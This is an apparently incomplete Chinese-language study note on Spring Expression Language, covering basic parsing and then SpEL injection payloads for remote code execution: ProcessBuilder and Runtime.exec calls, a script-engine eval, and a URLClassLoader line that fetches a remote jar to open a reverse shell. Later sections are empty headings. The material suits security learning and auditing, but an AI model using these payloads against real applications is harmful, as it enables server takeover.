### SpEL表达式的基本使用

#### 简介

* Spring表达式语言（简称 **SpEL**，全称**Spring Expression Language**）是一种功能强大的表达式语言，支持在运行时查询和操作对象图。
* SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。

#### Spel实现RCE

**基本使用：**

```java
ExpressionParser parser = new SpelExpressionParser();//创建解析器
Expression exp = parser.parseExpression("'Hello World'.concat('!')");//解析表达式
System.out.println( exp.getValue() );//取值，Hello World！
```



**自定义注册加载变量：**

```java
public class Spel {
    public String name = "何止";
    public static void main(String[] args) {
        Spel user = new Spel();
        StandardEvaluationContext context=new StandardEvaluationContext();
        context.setVariable("user",user);//通过StandardEvaluationContext注册自定义变量
        SpelExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression expression = parser.parseExpression("#user.name");//解析表达式
        System.out.println( expression.getValue(context).toString() );//取值,输出何止
    }
}
```



**调用命令执行方法：**

```java
String cmdStr = "new java.lang.ProcessBuilder(\"calc\").start()"; // java.lang下的类可以省略包名 
ExpressionParser parser = new SpelExpressionParser();//创建解析器
Expression exp = parser.parseExpression(cmdStr);//解析表达式
System.out.println( exp.getValue() );//弹出计算器
```

```java
//  SpEL、OGNL、MVEL等表达式均设计为在访问静态类时，使用T()显示表明这是一个静态类
String cmdStr = "T(java.lang.Runtime).getRuntime().exec(\"open /System/Applications/Calculator.app\")";
```

```java
String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")";  // 利用JavaScript引擎，这里JavaScript可替换为nashorn
```

**通过类加载器加载class实现RCE：**

```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8999/Exp.jar")}).loadClass("Exp").getConstructors()[0].newInstance("127.0.0.1:2333") //反弹shell
```

```java
"T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"calc\")";
"T(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.ProcessBuilder\").getConstructors()[1].newInstance(new String[]{\"calc\"}).start()";
// 这里得先获取AppClassLoader，可以通过其他类获取T(org.springframework.expression.Expression).getClass().getClassLoader()
```

#### 上下文环境

从前面自定义注册加载变量的代码中可以看出，SpEL表达式是由一个上下文环境的概念的

#### 在Spring中的使用

#### 分析过程

* 执行过程
* T()的分析

### SpEL表达式的常见利用语句

### SpEL相关漏洞分析

### SpEL表达式注入审计